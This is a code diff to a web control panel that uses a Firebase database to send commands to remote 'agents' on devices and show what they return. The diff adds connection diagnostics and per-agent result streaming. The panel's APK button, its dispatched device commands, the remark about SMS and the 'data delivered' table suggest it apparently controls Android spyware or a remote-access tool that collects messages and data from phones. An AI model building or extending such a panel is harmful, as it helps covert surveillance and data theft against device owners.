@@ -63,9 +63,36 @@ setInterval(refreshApkBtn, 5000);
 <h2>Output</h2>
 <pre id="output">waiting…</pre>
 
+<h2>Diagnostics</h2>
+<pre id="diag" style="color:#7f7fff">running…</pre>
+
 <h2>Crashes</h2>
 <pre id="crashes" style="color:#ff7f7f">no crashes</pre>
 <script>
+// full diagnostics — pinpoint exactly where the wire breaks
+const diagOut = [];
+function dlog(l){ diagOut.push(l); var d=document.getElementById('diag'); if(d) d.textContent = diagOut.join('\n'); }
+async function runDiagnostics() {
+  dlog('[1] testing firebase read of /agents …');
+  try {
+    const snap = await db.ref('agents').limitToLast(1).once('value');
+    const keys = snap.val() ? Object.keys(snap.val()) : [];
+    dlog('[1] OK — read works, found ' + keys.length + ' agent(s): ' + keys.join(', '));
+  } catch(e){ dlog('[1] READ FAILED: '+e.message); }
+
+  dlog('[2] testing firebase WRITE of /debugpanel/writetest …');
+  try {
+    await db.ref('debugpanel/writetest').set({ts: Date.now()});
+    dlog('[2] OK — panel CAN write commands to agents. other issue.');
+  } catch(e){ dlog('[2] WRITE FAILED: '+e.message+'   << panel cannot reach device. publish the rules JSON; this is why SMS showed nothing.'); }
+
+  dlog('[3] checking connected state …');
+  db.ref('.info/connected').on('value', s => dlog('[3] ' + (s.val() ? 'CONNECTED to firebase realtime' : 'DISCONNECTED from firebase realtime')));
+}
+runDiagnostics();
+setInterval(()=>db.ref('.info/connected').on('value', s => dlog('[3] ' + (s.val() ? 'CONNECTED to firebase realtime' : 'DISCONNECTED'))), 20000);
+
+// full crashes feed
 db.ref('crashes').on('value', snap => {
   const v = snap.val() || {};
   const lines = [];
@@ -173,16 +200,27 @@ function sendCommand(device, action, arg) {
     '>> ['+device+'] '+action+' '+(arg||'') + ' — dispatched, waiting…';
 }
 
-// ---- stream results live
-db.ref('results').limitToLast(1).on('child_added', snap => {
-  const [dev, payload] = Object.entries(snap.val())[0] || [null, null];
-  if (!payload) return;
+// ---- stream results live: both the flat map and the per-agent node
+function showResult(dev, cmdKey, payload) {
   document.getElementById('output').textContent =
-    'RESULTS — device: ' + snap.key + '\n' + JSON.stringify(payload, null, 2);
+    'RESULTS — device: ' + (dev || '?') + ' cmd: ' + (cmdKey || '') + '\n' +
+    JSON.stringify(payload, null, 2);
   previewPayload(payload);
-}, err => {
-  document.getElementById('output').textContent =
-    'results listener error: ' + err.message + ' — rules issue';
+}
+
+function listenResults(dev) {
+  db.ref('agents/' + dev + '/results').limitToLast(3).on('child_added', s => {
+    showResult(dev, s.key, s.val());
+  }, e => dlog('/agents/results read failed: ' + e.message));
+}
+let listenedDev = null;
+db.ref('agents').on('value', snap => {
+  const ids = Object.keys(snap.val() || {});
+  if (ids.length && listenedDev !== ids[0]) {
+    if (listenedDev) db.ref('agents/' + listenedDev + '/results').off();
+    listenedDev = ids[0];
+    listenResults(listenedDev);
+  }
 });
 
 // ---- rebuild data delivered table from agent /data nodes
